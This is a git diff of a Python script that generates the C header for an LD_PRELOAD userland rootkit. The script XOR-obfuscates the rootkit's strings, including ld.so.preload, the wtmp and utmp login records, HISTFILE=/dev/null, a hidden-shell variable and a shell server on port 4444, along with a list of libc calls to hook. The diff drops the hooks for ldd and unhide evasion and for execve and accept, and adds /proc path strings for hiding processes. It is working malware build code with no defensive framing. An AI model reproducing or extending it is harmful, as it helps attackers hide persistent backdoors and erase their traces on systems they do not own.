@@ -23,13 +23,6 @@ header_template = '''#define _GNU_SOURCE
 
 #define MAGIC_STRING\t"{magic_string}"
 #define CONFIG_FILE\t"{config_file}"
-#define C_UNHIDE\t"{c_unhide}"
-#define C_LDD\t"{c_ldd}"
-#define LD_TRACE\t"{ld_trace}"
-#define LD_LINUX\t"{ld_linux}"
-#define LD_NORMAL\t"{ld_normal}"
-#define LD_HIDE\t"{ld_hide}"
-#define CLEANUP_LOGS\t"{cleanup_logs}"
 #define WTMP_FILE_X\t"{wtmp_file}"
 #define UTMP_FILE_X\t"{utmp_file}"
 #define SYS_WRITE\t"{sys_write}"
@@ -39,8 +32,11 @@ header_template = '''#define _GNU_SOURCE
 #define SHELL_MSG\t"{shell_msg}"
 #define SHELL_SERVER\t"{shell_server}"
 #define HIDE_TERM_VAR\t"{hide_term_var}"
+#define HIDE_TERM_STR\t"{hide_term_str}"
 #define HIST_FILE\t"{hist_file}"
 #define TERM\t"{term}"
+#define CMD_PROC_NAME\t"{cmd_proc_name}"
+#define PROC_PATH\t"{proc_path}"
 
 #define MAX_LEN 1024
 
@@ -59,17 +55,13 @@ header_template = '''#define _GNU_SOURCE
 #define SYS_RMDIR 5
 #define SYS_LINK 6
 #define SYS_UNLINK 7
-#define SYS_XSTAT 8
-#define SYS_LXSTAT 9
-#define SYS_UNLINKAT 10
+#define SYS_UNLINKAT 8
+#define SYS_XSTAT 9
+#define SYS_LXSTAT 10
 #define SYS_MKDIR 11
 #define SYS_MKDIRAT 12
-#define SYS_EXECVE 13
-#define SYS_ACCEPT 14
-#define SYS_FXSTAT 15
-#define SYS_FXSTATAT 16
 
-#define SYSCALL_SIZE 17
+#define SYSCALL_SIZE 13
 
 static char *syscall_table[SYSCALL_SIZE] = {{
 '''
@@ -87,27 +79,17 @@ syscalls = [
     "stat",
     "lstat",
     "mkdir",
-    "mkdirat",
-    "execve",
-    "accept",
-    "fstat",
-    "fstatat",
+    "mkdirat"
 ]
 
 header = header_template.format(
     magic_string="__",
     config_file=xor("ld.so.preload"),
-    c_unhide=xor("bin/unhide"),
-    c_ldd=xor("bin/ldd"),
-    ld_trace=xor("LD_TRACE_LOADED_OBJECTS"),
-    ld_linux=xor("ld-linux"),
-    ld_normal=xor("/etc/ld.so.preload"),
-    ld_hide=xor("/etc/__ld.so.preload"),
-    cleanup_logs=xor("CLEANUP_LOGS"),
     wtmp_file=xor("/var/log/wtmp"),
     utmp_file=xor("/var/run/utmp"),
     shell_type=xor("/bin/sh"),
     hide_term_var=xor("HIDE_THIS_SHELL=foobar"),
+    hide_term_str=xor("HIDE_THIS_SHELL"),
     hist_file=xor("HISTFILE=/dev/null"),
     term=xor("TERM=xterm"),
     sys_write=xor("write"),
@@ -116,7 +98,9 @@ header = header_template.format(
     low_port=61041,
     high_port=61051,
     shell_server=xor("shellserver"),
-    shell_server_port=4444
+    shell_server_port=4444,
+    cmd_proc_name=xor("/proc/%d/status"),
+    proc_path=xor("/proc/")
 )
 
 # XOR the syscall names and format them into a list
